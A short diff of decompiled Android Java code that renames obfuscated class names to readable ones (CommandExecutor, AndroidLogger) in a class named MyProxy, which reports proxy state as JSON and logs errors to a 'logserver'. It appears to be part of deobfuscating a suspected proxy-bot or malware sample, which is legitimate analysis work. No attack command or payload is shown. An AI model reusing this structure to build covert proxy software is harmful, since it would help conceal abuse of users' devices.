@@ -14,8 +14,8 @@ import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import linker.resourcer.encoder.RequestHandler;
-import linker.resourcer.encoder.etkmbyodxlwuglfdj;
-import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
+import linker.resourcer.encoder.CommandExecutor;
+import linker.resourcer.encoder.AndroidLogger;
 import org.json.JSONObject;
 
 public class MyProxy {
@@ -31,10 +31,10 @@ public class MyProxy {
             JSONObject jSONObject = new JSONObject();
             jSONObject.put("ctype", (Object)"state");
             jSONObject.put("pxstate", (Object)string2);
-            etkmbyodxlwuglfdj.instance(context).ProxyMsg(context, jSONObject);
+            CommandExecutor.instance(context).ProxyMsg(context, jSONObject);
         }
         catch (Exception exception) {
-            maagohqzehyoivaxlfkohrpeu.Error("logserver", "Error " + exception.getMessage());
+            AndroidLogger.Error("logserver", "Error " + exception.getMessage());
             exception.printStackTrace();
         }
     }
